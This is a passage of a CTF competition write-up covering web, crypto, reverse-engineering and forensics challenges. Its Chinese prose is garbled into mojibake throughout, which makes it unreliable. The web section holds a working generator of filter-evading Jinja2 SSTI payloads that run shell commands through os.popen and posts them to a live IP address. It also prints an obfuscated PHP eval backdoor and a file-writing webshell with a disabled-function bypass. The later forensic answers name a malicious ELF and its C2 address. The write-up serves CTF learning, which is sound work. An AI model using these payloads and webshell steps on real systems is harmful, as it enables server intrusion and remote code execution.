sorted(num_map.keys(),reverse=True) r = [] for i in keys: while num \u0026gt;= i: num -= i r.append(num_map[i]) final_number = f\u0026#34;(([{\u0026#39;,\u0026#39;.join(r)}])|sum)\u0026#34; return final_number def use_c(target): # format_c = \u0026#39;(()|select|string|urlencode)[0]~(()|select|string)[15]\u0026#39; # %c # format_c = \u0026#39;(()|select|string|urlencode)|attr(\\\u0026#39;__getitem__\\\u0026#39;)(0)~(()|select|string)|attr(\\\u0026#39;__getitem__\\\u0026#39;)(15)\u0026#39; # åœ¨æ¯ä¸ªpayloadå¼€å¤´åŠ ä¸Š: {% set c = (()|select|string|urlencode)[0]~(()|select|string)[15] %} # åˆ™format_c å¯ä»¥è¿™æ ·å†™: format_c = \u0026#39;c\u0026#39; format_c = \u0026#39;((()|select|string|urlencode)[0]~(()|select|string)[15])\u0026#39; format_s = (\u0026#39;%s~\u0026#39;*len(target))[:-1] # %s~%s~%s~%s~ .... if False: # ä¸ä½¿ç”¨æ³¢æµªçº¿ # ç”¨join æ›¿ä»£æ³¢æµªçº¿ format_c = \u0026#39;[(()|select|string|urlencode)[0],(()|select|string)[15]]|join\u0026#39; format_s = \u0026#39;[\u0026#39;+(\u0026#39;,\u0026#39;.join([\u0026#39;%s\u0026#39; for i in range(len(target))])) + \u0026#39;]|join\u0026#39; if True: # ä¸ä½¿ç”¨æ•°å­— format_c = f\u0026#39;[(()|select|string|urlencode)[{generate_number(0)}],(()|select|string)[{generate_number(15)}]]|join\u0026#39; format_s = \u0026#39;[\u0026#39;+(\u0026#39;,\u0026#39;.join([\u0026#39;%s\u0026#39; for i in range(len(target))])) + \u0026#39;]|join\u0026#39; format_tuple = (format_c,)*len(target) _class_ascii = \u0026#39;,\u0026#39;.join([str(ord(c)) for c in target]) # _class_ascii = \u0026#39;,\u0026#39;.join([generate_number(ord(c)) for c in target]) format_tuple+= (_class_ascii,) # |format() å’Œ % å¯ä»¥å¹³æ›¿ result = f\u0026#39;(({format_s})|format(%s))\u0026#39; # result = f\u0026#39;(({format_s})%%(%s))\u0026#39; result = result%format_tuple return result def str2chr(string): r = \u0026#39;\u0026#39; for c in string: r += f\u0026#39;chr({ord(c)})+\u0026#39; return r[:-1] def str2ascii(string): r = \u0026#39;\u0026#39; for c in string: r += f\u0026#39;{ord(c)},\u0026#39; return r[:-1] def payload2(cmd): # v1 ä¸ä½¿ç”¨å¼•å· # ä½¿ç”¨å­—ç¬¦ï¼š{{ [] () ~ | attr select string urlencode format lipsum # payload = \u0026#39;{{((lipsum[%s][%s][%s](%s))|attr(%s)(%s))|attr(%s)()}}\u0026#39; % (use_c(\u0026#39;__globals__\u0026#39;),use_c(\u0026#39;__builtins__\u0026#39;),use_c(\u0026#39;__import__\u0026#39;),use_c(\u0026#39;os\u0026#39;),use_c(\u0026#39;popen\u0026#39;),use_c(\u0026#39;whoami\u0026#39;),use_c(\u0026#39;read\u0026#39;)) # v2 ä¸ä½¿ç”¨ [] # ä½¿ç”¨å­—ç¬¦ï¼š{{ \u0026#39; () ~ | attr select string urlencode format lipsum # ä½¿ç”¨æ—¶å€™æŠŠ use_c çš„ format_c æ”¹ä¸€ä¸‹ # lipsum,url_for,get_flashed_messages å¯äº’æ¢ payload = \u0026#39;{{get_flashed_messages|attr(%s)|attr(%s)(%s)|attr(%s)(%s)(%s)|attr(%s)(%s)|attr(%s)()}}\u0026#39;%(use_c(\u0026#39;__globals__\u0026#39;),use_c(\u0026#39;get\u0026#39;),use_c(\u0026#39;__builtins__\u0026#39;),use_c(\u0026#39;get\u0026#39;),use_c(\u0026#39;__import__\u0026#39;),use_c(\u0026#39;os\u0026#39;),use_c(\u0026#39;popen\u0026#39;),use_c(cmd),use_c(\u0026#39;read\u0026#39;)) return payload import requests url = \u0026#39;http://39.105.45.179:30722/\u0026#39; requests.post(url=url,data={\u0026#39;code\u0026#39;:payload2(\u0026#39;mkdir /app/static\u0026#39;)}) requests.post(url=url,data={\u0026#39;code\u0026#39;:payload2(\u0026#39;cat /flag \u0026gt; /app/static/flag.html\u0026#39;)}) WEB hello_web By Ron è¿æ¥å®¹å™¨ï¼Œå‘ç°è‡ªåŠ¨è·³è½¬åˆ°index.php?file=hello.php\n?fileå­—æ ·çŒœæµ‹æ˜¯æ–‡ä»¶åŒ…å«\nçœ‹ä¸»é¡µæºä»£ç å‘ç°../tips.phpå’Œ../hackme.phpï¼Œ?fileè¿‡æ»¤äº†data,http,php://\nä¸»é¡µå›æŠ¥çš„å¤´ä¸­å‘ç°tip: \u0026amp;#105;\u0026amp;#110;\u0026amp;#99;\u0026amp;#108;\u0026amp;#117;\u0026amp;#100;\u0026amp;#101;\u0026amp;#46;\u0026amp;#112;\u0026amp;#104;\u0026amp;#112ï¼Œè§£ç å‘ç°æ˜¯include.php\nå°è¯•file:///var/log/nginx/access.logåŒ…å«æ—¥å¿—ï¼Œæ‰“ä¸é€š\n../å’Œ/åè·Ÿtips.phpå’Œhackme.phpéƒ½è¯´ä¸æ˜¯è¿™é‡Œï¼ŒçŒœæµ‹è¿‡æ»¤äº†../ï¼Œè¢«æ¶ˆé™¤äº†ï¼Œæ‰€ä»¥è¿›è¡ŒåŒå†™ç»•è¿‡(....//)\n....//tips.phpä¸‹æ˜¯phpinfoï¼Œ....//hackme.phpä¸‹æ˜¯\n1 2 3 4 5 6 \u0026lt;?php highlight_file(__FILE__); $lJbGIY=\u0026#34;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME\u0026#34;;$OlWYMv=\u0026#34;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel\u0026#34;;$lapUCm=urldecode(\u0026#34;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A\u0026#34;); $YwzIst=$lapUCm{3}.$lapUCm{6}.$lapUCm{33}.$lapUCm{30};$OxirhK=$lapUCm{33}.$lapUCm{10}.$lapUCm{24}.$lapUCm{10}.$lapUCm{24};$YpAUWC=$OxirhK{0}.$lapUCm{18}.$lapUCm{3}.$OxirhK{0}.$OxirhK{1}.$lapUCm{24};$rVkKjU=$lapUCm{7}.$lapUCm{13};$YwzIst.=$lapUCm{22}.$lapUCm{36}.$lapUCm{29}.$lapUCm{26}.$lapUCm{30}.$lapUCm{32}.$lapUCm{35}.$lapUCm{26}.$lapUCm{30}; eval($YwzIst(\u0026#34;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==\u0026#34;)); ?\u0026gt; 1 2 3 4 5 6 \u0026lt;?php highlight_file(__FILE__); $lJbGIY=\u0026#34;eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME\u0026#34;;$OlWYMv=\u0026#34;zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel\u0026#34;;$lapUCm=urldecode(\u0026#34;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A\u0026#34;); $YwzIst=$lapUCm{3}.$lapUCm{6}.$lapUCm{33}.$lapUCm{30};$OxirhK=$lapUCm{33}.$lapUCm{10}.$lapUCm{24}.$lapUCm{10}.$lapUCm{24};$YpAUWC=$OxirhK{0}.$lapUCm{18}.$lapUCm{3}.$OxirhK{0}.$OxirhK{1}.$lapUCm{24};$rVkKjU=$lapUCm{7}.$lapUCm{13};$YwzIst.=$lapUCm{22}.$lapUCm{36}.$lapUCm{29}.$lapUCm{26}.$lapUCm{30}.$lapUCm{32}.$lapUCm{35}.$lapUCm{26}.$lapUCm{30}; eval($YwzIst(\u0026#34;JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw==\u0026#34;)); ?\u0026gt; \u0026lt;?php @eval($_POST['cmd_66.99']); ?\u0026gt;\nå‚æ•°ååº”è¯¥æ˜¯cmd[66.99ï¼Œphpä¸­ç¬¬ä¸€ä¸ª[ä¼šè¢«å½“ä½œéæ³•å­—ç¬¦æ›¿æ¢æˆ_ã€‚\nå†™ä¸ªshellï¼Œcmd[66.99=file_put_contents('shell.php','\u0026lt;?php @eval($_POST[1]);?\u0026gt;');ï¼Œå†ä½¿ç”¨èšå‰‘è¿æ¥\nå‘ç°æ— æ³•æ‰§è¡Œå‘½ä»¤ï¼Œä½¿ç”¨èšå‰‘æ’ä»¶ç»•è¿‡ç¦ç”¨çš„å‡½æ•°\nå‚è€ƒæ–‡çŒ®ï¼šhttps://blog.csdn.net/qq_62987084/article/details/142058918\nä¿®æ”¹èšå‰‘è¿æ¥\næ‰§è¡ŒæˆåŠŸ\nfind / -name \u0026quot;*flag*\u0026quot; 2\u0026gt; /dev/null\næˆåŠŸcat flag\nCrypto rasnd By Ron ä½¿ç”¨è„šæœ¬è¿æ¥é¶æœºï¼Œçˆ†ç ´å¾—åˆ°flag1ï¼Œflag2éœ€è¦ä½¿ç”¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 from pwn import * from Crypto.Util.number import * import math # Config LOCAL = False remote_addr = \u0026#39;IP_ADDRESS\u0026#39; # CHANGEME remote_port = 65535 # CHANGEME context.log_level=\u0026#39;INFO\u0026#39; # [\u0026#39;CRITICAL\u0026#39;, \u0026#39;DEBUG\u0026#39;, \u0026#39;ERROR\u0026#39;, \u0026#39;INFO\u0026#39;, \u0026#39;NOTSET\u0026#39;, \u0026#39;WARNING\u0026#39;] e = 65537 def get_Process(): if LOCAL: p = process(file) else: p = remote(remote_addr ,remote_port) return p def decrypt1(n: int, c: int, hint1: int, hint2: int): for i in range(2**11): for j in range(2**11): R = GCD(hint1*i - hint2*j,n) if 1 \u0026lt; R and R \u0026lt; n: q = GCD(hint1*i - hint2*j,n) print(q) p = n//q d = inverse(e,(p-1)*(q-1)) m = pow(c,d,n) return(long_to_bytes(m).decode()) def decrypt2(n: int, c: int, hint: int): b = pow(hint, -1, n) c_quadratic = -514 * n delta = b * b - 4 * 114 * c_quadratic sqrt_delta = int(math.isqrt(delta)) q = (-b + sqrt_delta) // (2 * 114) if n % q != 0: q = (-b - sqrt_delta) // (2 * 114) p = n // q phi = (p - 1) * (q - 1) d = pow(e, -1, phi) m = pow(c, d, n) return long_to_bytes(m).decode() def exp(): p = get_Process() # Real Start of EXP # æ¥æ”¶========= p.recvuntil(b\u0026#39;\\n\u0026#39;) # Crypto1 c1n = int(p.recvuntil(b\u0026#39;\\n\u0026#39;).decode()) c1c = int(p.recvuntil(b\u0026#39;\\n\u0026#39;).decode()) c1hint1 = int(p.recvuntil(b\u0026#39;\\n\u0026#39;).decode()) + 0x114 c1hint2 = int(p.recvuntil(b\u0026#39;\\n\u0026#39;).decode()) + 0x514 print(f\u0026#39;[*] c1n={c1n}\u0026#39;) print(f\u0026#39;[*] c1c={c1c}\u0026#39;) print(f\u0026#39;[*] c1hint1={c1hint1}\u0026#39;) print(f\u0026#39;[*] c1hint2={c1hint2}\u0026#39;) # æ¥æ”¶========= p.recvuntil(b\u0026#39;\\n\u0026#39;) # Crypto2 c2n = int(p.recvuntil(b\u0026#39;\\n\u0026#39;).decode()) c2c = int(p.recvuntil(b\u0026#39;\\n\u0026#39;).decode()) c2hint = int(p.recvuntil(b\u0026#39;\\n\u0026#39;).decode()) print(f\u0026#39;[*] c2n={c2n}\u0026#39;) print(f\u0026#39;[*] c2c={c2c}\u0026#39;) print(f\u0026#39;[*] c2hint={c2hint}\u0026#39;) p.close() # æ¥æ”¶æ•°æ®å®Œæˆ flag = decrypt1(c1n, c1c, c1hint1, c1hint2) print(\u0026#39;[+] Flag1 Decrypted!\u0026#39;) flag += decrypt2(c2n, c2c, c2hint) print(\u0026#39;[+] Flag2 Decrypted!\u0026#39;) print(flag) if __name__ == \u0026#39;__main__\u0026#39;: exp() Reverse ezCsky By Jeremiah Ghidraæ‰“å¼€å¯ä»¥çœ‹åˆ°å‡½æ•°çš„å¯¼å‡ºè¡¨æœ‰rc4åŠ å¯†å’Œswapå’Œxorçš„å­—æ ·\nåœ¨010ä¸­å¯ä»¥çœ‹åˆ°æœ‰testkeyï¼ŒçŒœæµ‹ä¸ºrc4çš„å¯†é’¥ï¼Œåœ¨0xAA0ä½ç½®æœ‰42å­—èŠ‚çš„å¯†æ–‡æ•°æ®æå–å‡ºæ¥å¹¶è¿›è¡Œrc4è§£å¯†å¯ä»¥å¾—åˆ°hexæ•°æ®0a0d061c1f545653575100031d14585603191c0054034b14580702494c020701510c0800010003004f7d\nçŒœæµ‹xoréƒ¨åˆ†æ˜¯ä»¥ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸ºå‡†ä¸ä¸‹ä¸€ä½å¼‚æˆ–å¾—åˆ°æ˜æ–‡ï¼Œæœ€åæŠŠå­—ç¬¦ä¸²åè½¬åå¾—åˆ°flagï¼Œexpå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; static const char *hex_cipher = \u0026#34;0a0d061c1f545653575100031d14585603191c0054034b14580702494c020701510c0800010003004f7d\u0026#34;; int main(void) { size_t hex_len = strlen(hex_cipher); size_t enc_len = hex_len / 2; unsigned char *encrypted = malloc(enc_len); for (size_t i = 0; i \u0026lt; enc_len; i++) { unsigned int val; sscanf(hex_cipher + 2*i, \u0026#34;%2x\u0026#34;, \u0026amp;val); encrypted[i] = (unsigned char)val; } unsigned char *decrypted = calloc(enc_len + 1, 1); for (size_t i = 0; i \u0026lt; enc_len; i++) { unsigned char c = encrypted[enc_len - 1 - i]; decrypted[i+1] = decrypted[i] ^ c; } for (size_t i = 0; i \u0026lt; (enc_len+1)/2; i++) { unsigned char temp = decrypted[i]; decrypted[i] = decrypted[enc_len - i]; decrypted[enc_len - i] = temp; } ssize_t final_len = enc_len; while (final_len \u0026gt;= 0 \u0026amp;\u0026amp; decrypted[final_len] == 0) { final_len--; } final_len++; decrypted[final_len] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;%s\\n\u0026#34;, decrypted); free(encrypted); free(decrypted); return 0; } //flag{d0f5b330-9a74-11ef-9afd-acde48001122} Reverse dump è¿è¡Œé¢˜ç›®ç»™çš„ç¨‹åºå‘ç°ä»»æ„æ›´æ”¹ä¸€ä¸ªå­—ç¬¦ä¸ä¼šå¯¼è‡´åé¢çš„è¾“å‡ºäº§ç”Ÿé—®é¢˜\nå¹¶ä¸”å°è¯•è¾“å…¥flag{å‘ç°è·Ÿé¢˜ç›®ç»™çš„å†…å®¹å‰å‡ ä½ä¸€è‡´\næ¨æµ‹ä¸ºè‡ªå®šä¹‰å­—ç¬¦è¡¨ï¼Œæ‰€ä»¥å¯ä»¥çˆ†ç ´ï¼Œçˆ†ç ´å¾—åˆ°ç»“æœä¸ºflag{MTczMDc4MzQ2Ng==}\nForensic zeroshell_1 åœ¨Packet 11029çš„httpè¯·æ±‚çš„Refererå‘ç°ç–‘ä¼¼Base64ç¼–ç å†…å®¹\nZmxhZ3s2QzJFMzhEQS1EOEU0LThEODQtNEE0Ri1FMkFCRDA3QTFGM0F9\nè§£ç åå¾—åˆ°flagä¸ºflag{6C2E38DA-D8E4-8D84-4A4F-E2ABD07A1F3A}\nForensic zeroshell_2 å› ä¸ºç»™äº†è™šæ‹Ÿæœºï¼Œç›´æ¥ç”¨DiskgeniusæŒ‚è½½ç£ç›˜\nå‘ç°å››ä¸ªåˆ†åŒºï¼Œç»è¿‡å¯»æ‰¾ååœ¨ç¬¬å››ä¸ªåˆ†åŒºPROFILES/\\_DB.001é‡Œé¢æ‰¾åˆ°flagæ–‡ä»¶ï¼Œå†…å®¹ä¸ºc6045425-6e6e-41d0-be09-95682a4f65c4ï¼Œæ‰€ä»¥flagä¸ºflag{c6045425-6e6e-41d0-be09-95682a4f65c4}\nForensic zeroshell_3 åœ¨æ‰¾ç¬¬äºŒé¢˜çš„æ—¶å€™ï¼ŒåŒçº§ç›®å½•ä¸‹å‘ç°ç”¨.nginxæ–‡ä»¶ä¸”å¤§å°å¼‚å¸¸ï¼ˆ816.4KB)ï¼Œçº¯æ–‡æœ¬æ‰“å¼€å‘ç°ELFå¤´\nä¸¢è¿›IDAï¼Œåœ¨sub_804D9A4å‡½æ•°ä¸­å‘ç°IPåœ°å€202.115.89.103ï¼Œæ‰€ä»¥ç»“æœä¸ºflag{202.115.89.103}\nForensic zeroshell_4 éšç€ä¸Šä¸€é¢˜ï¼Œå› ä¸º.nginxå¤§å°å¼‚å¸¸ä¸”å¸¦æœ‰ELFå¤´ï¼Œæ‰€ä»¥ç­”æ¡ˆæ˜¯flag{.nginx}\nForensic zeroshell_5 åœ¨IDAä¸­ï¼ŒæŒ‰ä¸‹Shift + F12ï¼Œåœ¨ä¸Šé¢IPåœ°å€çš„æ­£ä¸‹æ–¹å‘ç°æ„ä¹‰ä¸æ˜çš„å­—ç¬¦ä¸²11223344qweasdzxcï¼Œæ¨æµ‹ä¸ºå¯†ç ï¼Œæäº¤æ­£ç¡®\nForensic WinFT_1 æ‰“å¼€é¢˜ç›®æä¾›çš„è™šæ‹Ÿæœºï¼Œä½¿ç”¨æ¡Œé¢æä¾›çš„Currport.exeï¼Œå‘ç°å¯ç–‘ç¨‹åºflvupdate.exe\nè¿›ä¸€æ­¥æŸ¥çœ‹å‘ç°è¿œç«¯åŸŸåä¸ºmiscsecure.comï¼ŒIPåœ°å€ä¸º192.168.116.130ï¼Œç«¯å£ä¸º443ï¼Œæ‰€ä»¥flagä¸ºflag{miscsecure.com:192.168.116.130:443}\nForensic WinFT_2 è®¡åˆ’ä»»åŠ¡ç¨‹åºå‘ç°å¯ä»¥è®¡åˆ’Driverupdatesï¼Œç‚¹å…¥å‘ç°æè¿°å†…æœ‰å†…å®¹\nf^l^a^g^:JiM3ODsmIzEwNTsmIzk5OyYjMTAxOyYjNjUyOTI7JiMxMDI7JiMxMDg7JiM5NzsmIzEwMzsmIzMyOyYjMTA1OyYjMTE1OyYjMzI7JiMxMjM7JiM2NTsmIzY5OyYjODM7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzk1OyYjMTA1OyYjMTE1OyYjOTU7JiM5NzsmIzExMDsmIzk1OyYjMTAxOyYjMTIwOyYjOTk7JiMxMDE7JiMxMDg7JiMxMDg7JiMxMDE7JiMxMTA7JiMxMTY7JiM5NTsmIzEwMTsmIzExMDsmIzk5OyYjMTE0OyYjMTIxOyYjMTEyOyYjMTE2OyYjMTA1OyYjMTExOyYjMTEwOyYjOTU7JiM5NzsmIzEwODsmIzEwMzsmIzExMTsmIzExNDsmIzEwNTsmIzExNjsmIzEwNDsmIzEwOTsmIzEyNTs=\nå†’å·åé¢ç–‘ä¼¼Base64ï¼Œæ”¾å…¥èµ›åšå¨å­ï¼Œç»è¿‡Base64 + HTML Entityå¯ä»¥å¾—åˆ°ç»“æœä¸ºNiceï¼Œflag is {AES_encryption_algorithm_is_an_excellent_encryption_algorithm}ï¼Œæ‰€ä»¥flagä¸ºflag{AES_encryption_algorithm_is_an_excellent_encryption_algorithm}\nForensic Sc05_1 ä»ç»™çš„Excelè¡¨æ ¼ä¸­æœç´¢IP 134.6.4.12ï¼Œå‘ç°TCPè¿æ¥æ¯”HTTPæ—©ï¼Œæ‰€ä»¥é‡‡ç”¨TCPè¿æ¥çš„æ—¶é—´2024/11/09 16:22:42\næ ¹æ®é¢˜ç›®è¦æ±‚ï¼Œæ”¹ä¸º2024/11/09_16:22:42ï¼Œè¿›è¡ŒMD5è®¡ç®—å¹¶è½¬æ¢ä¸ºå¤§å†™ï¼Œæœ€åç­”æ¡ˆä¸ºflag{01DF5BC2388E287D4CC8F11EA4D31929}\nForensic Kiwi åœ¨ç¬¬33414ä¸ªåŒ…å‘ç°ç–‘ä¼¼ç»è¿‡Base64ç¼–ç çš„å†…å®¹\nl1Mvs8wZ1LI/v3Vup1zF8bzdp1B51zz0e0xdfIXNBQMOe1wFEg+Z03ljczfC1qGdp0Y6bWnJ7rUqnQrZmVT9nFPRXqYpURBxuBKInjI5Q2xVgs56q4VRCQWbiyv00Aw7D0CKEotHSy6sQAC1x3T9wDx6xPCioqx/0nwNgrvJnF1Oq7NFZsVpnAxaZC5BVfKSEttFPjYgv3uSfmtxeJg7pPCHmJ8qf/Sd7W7n3gKSB2BELb==\nå°†é¢˜ç›®æä¾›çš„ç¨‹åºä¸¢è¿›IDAï¼Œå‘ç°å‡½æ•°sub_140082974å†…æœ‰åŠ å¯†é€»è¾‘\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 void __fastcall sub_140082974(__int64 a1, _QWORD *a2) { __int64 v2; // rdi _QWORD *v3; // r13 unsigned __int16 v5; // ax int v6; // ebx __int64 v7; // rdx int v8; // ecx _WORD *v9; // r12 _WORD *v10; // rax _WORD *v11; // r14 _WORD *v12; // rbp __int64 v13; // r15 __int64 v14; // r13 int v15; // ebp __int64 v16; // r9 int v17; // r8d unsigned __int64 v18; // rdx _WORD *v19; // r10 unsigned __int64 v20; // r11 __int64 v21; // rbx __int64 v22; // rdx unsigned __int64 v23; // rcx __int16 v24; // dx __int16 v25; // ax _BYTE *v26; // rax _BYTE *v27; // rbx __int16 *v28; // rdx signed __int64 v29; // rax __int16 v30; // cx _WORD *v31; // rcx __int64 v32; // rdx __int16 v33; // ax _BYTE *v34; // rcx v2 = -1i64; v3 = a2; do ++v2; while ( *(_WORD *)(a1 + 2 * v2) ); v5 = 70; v6 = 0; v7 = 0i64; v8 = 1; do { v6 = (v6 + v8 * v5) % 256; v5 = byte_140111152[v7++]; ++v8; } while ( v5 ); srand(v6); v9 = j__malloc_base(2i64 * (int)v2 + 2); v10 = j__malloc_base(2i64 * (4 * (int)v2 / 3) + 72); v11 = v10; if ( !v9 || !v10 ) goto LABEL_36; if ( (int)v2 \u0026gt; 0 ) { v12 = v9; v13 = a1 - (_QWORD)v9; v14 = (int)v2; do { *v12 = rand() % 128 + (v6 ^ *(_WORD *)((char *)v12 + v13)); ++v12; --v14; } while ( v14 ); v3 = a2; } v9[(int)v2] = 0; v15 = 0; if ( (int)v2 \u0026gt; 0 ) { v16 = 0i64; v17 = 2; v18 = ((int)v2 - 1i64) / 3ui64; v19 = v9 + 2; v20 = v18 + 1; v15 = 4 * (v18 + 1); do { if ( v17 - 1 \u0026gt;= (int)v2 ) v21 = 0i64; else v21 = (unsigned __int8)*(v19 - 1); if ( v17 \u0026gt;= (int)v2 ) v22 = 0i64; else v22 = (unsigned __int8)*v19; v23 = v22 | ((v21 | ((unsigned __int64)(unsigned __int8)*(v19 - 2) \u0026lt;\u0026lt; 8)) \u0026lt;\u0026lt; 8); v11[v16] = word_140111070[v23 \u0026gt;\u0026gt; 18]; v11[v16 + 1] = word_140111070[(v23 \u0026gt;\u0026gt; 12) \u0026amp; 0x3F]; if ( v17 - 1 \u0026gt;= (int)v2 ) v24 = 61; else v24 = word_140111070[(v23 \u0026gt;\u0026gt; 6) \u0026amp; 0x3F]; v11[v16 + 2] = v24; if ( v17 \u0026gt;= (int)v2 ) v25 = 61; else v25 = word_140111070[v23 \u0026amp; 0x3F]; v11[v16 + 3] = v25; v17 += 3; v16 += 4i64; v19 += 3; --v20; } while ( v20 ); } v11[v15] = 0; v26 = j__malloc_base(2i64 * v15 + 66); v27 = v26; if ( !v26 ) { LABEL_36: printf(L\u0026#34;Memory allocation failed\\n\u0026#34;); exit(1); } v28 = (__int16 *)\u0026amp;unk_140111100; v29 = v26 - (_BYTE *)\u0026amp;unk_140111100; do { v30 = *v28; *(__int16 *)((char *)v28 + v29) = *v28; ++v28; } while ( v30 ); v31 = v27 - 2; do ++v31; while ( *v31 ); v32 = 0i64; do { v33 = v11[v32]; v31[v32++] = v33; } while ( v33 ); v34 = v27 - 2; do v34 += 2; while ( *(_WORD *)v34 ); *(_OWORD *)v34 = xmmword_140111128; *((_OWORD *)v34 + 1) = xmmword_140111138; *((_WORD *)v34 + 16) = 0; j__free_base(v9); j__free_base(v11); *v3 = v27; } åœ¨æ•°æ®æ®µword_140111070å‘ç°ç–‘ä¼¼Base64è¡¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 .rdata:0000000140111070 word_140111070 dw 64h ; DATA XREF: sub_140082974+18Fâ†‘r .rdata:0000000140111070 ; sub_140082974+1A6â†‘r ... .rdata:0000000140111072 db 2Bh ; + .rdata:0000000140111073 db 0 .rdata:0000000140111074 db 46h ; F .rdata:0000000140111075 db 0 .rdata:0000000140111076 db 33h ; 3 .rdata:0000000140111077 db 0 .rdata:0000000140111078 db 44h ; D .rdata:0000000140111079 db 0 .rdata:000000014011107A db 77h ; w .rdata:000000014011107B db 0 .rdata:000000014011107C db 57h ; W .rdata:000000014011107D db 0 .rdata:000000014011107E db 6Ah ; j .rdata:000000014011107F db 0 .rdata:0000000140111080 db 38h ; 8 .rdata:0000000140111081 db 0 .rdata:0000000140111082 db 74h ; t .rdata:0000000140111083 db 0 .rdata:0000000140111084 db 55h ; U .rdata:0000000140111085 db 0 .rdata:0000000140111086 db 63h ; c .rdata:0000000140111087 db 0 .rdata:0000000140111088 db 6Bh ; k .rdata:0000000140111089 db 0 .rdata:000000014011108A db 56h ; V .rdata:000000014011108B db 0 .rdata:000000014011108C db 47h ; G .rdata:000000014011108D db 0 .rdata:000000014011108E db 5Ah ; Z .rdata:000000014011108F db 0 .rdata:0000000140111090 db 62h ; b .rdata:0000000140111091 db 0 .rdata:0000000140111092 db 35h ; 5 .rdata:0000000140111093 db 0 .rdata:0000000140111094 db 37h ; 7 .rdata:0000000140111095 db 0 .rdata:0000000140111096 db 53h ; S .rdata:0000000140111097 db 0 .rdata:0000000140111098 db 31h ; 1 .rdata:0000000140111099 db 0 .rdata:000000014011109A db 58h ; X .rdata:000000014011109B db 0 .rdata:000000014011109C db 73h ; s .rdata:000000014011109D db 0 .rdata:000000014011109E db 4Ch ; L .rdata:000000014011109F db 0 .rdata:00000001401110A0 db 71h ; q .rdata:00000001401110A1 db 0 .rdata:00000001401110A2 db 66h ; f .rdata:00000001401110A3 db 0 .rdata:00000001401110A4 db 6Dh ; m .rdata:00000001401110A5 db 0 .rdata:00000001401110A6 db 30h ; 0 .rdata:00000001401110A7 db 0 .rdata:00000001401110A8 db 76h ; v .rdata:00000001401110A9 db 0 .rdata:00000001401110AA db 6Eh ; n .rdata:00000001401110AB db 0 .rdata:00000001401110AC db 70h ; p .rdata:00000001401110AD db 0 .rdata:00000001401110AE db 65h ; e .rdata:00000001401110AF db 0 .rdata:00000001401110B0 db 4Dh ; M .rdata:00000001401110B1 db 0 .rdata:00000001401110B2 db 